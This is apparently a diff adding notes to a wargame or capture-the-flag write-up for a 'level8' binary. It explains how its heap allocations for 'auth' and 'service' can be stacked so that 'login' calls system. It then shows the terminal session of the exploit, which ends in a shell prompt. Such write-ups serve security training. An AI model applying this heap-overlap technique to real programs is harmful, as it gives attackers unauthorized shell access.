@@ -163,3 +163,29 @@ Start in GDB
 	   0x08048737 <+467>:	pop    ebp
 	   0x08048738 <+468>:	ret
 	End of assembler dump.
+
+The program is more complex than others, need to translate it in C before trying to understand
+
+After (long long time) trying to translate in c, we can see interesting things in our pseudo c code
+
+The program increase the size of 2 global variables (auth, service) with malloc, 10 by 10, when the input is "auth " or "service"
+
+There is also a case when the input is "login", a check in the memory on auth+32, if the memory is not 0, the function "system" is called
+
+So, we can understand what we need to do : init the auth variable, increase the service variable until the service variable overwrite auth+32
+
+	$ ./level8
+	(nil), (nil)
+	auth
+	0x804a008, (nil)
+	service
+	0x804a008, 0x804a018
+	login
+	Password:
+	0x804a008, 0x804a018
+	service
+	0x804a008, 0x804a028
+	login
+	$
+
+Good! 2 times needed
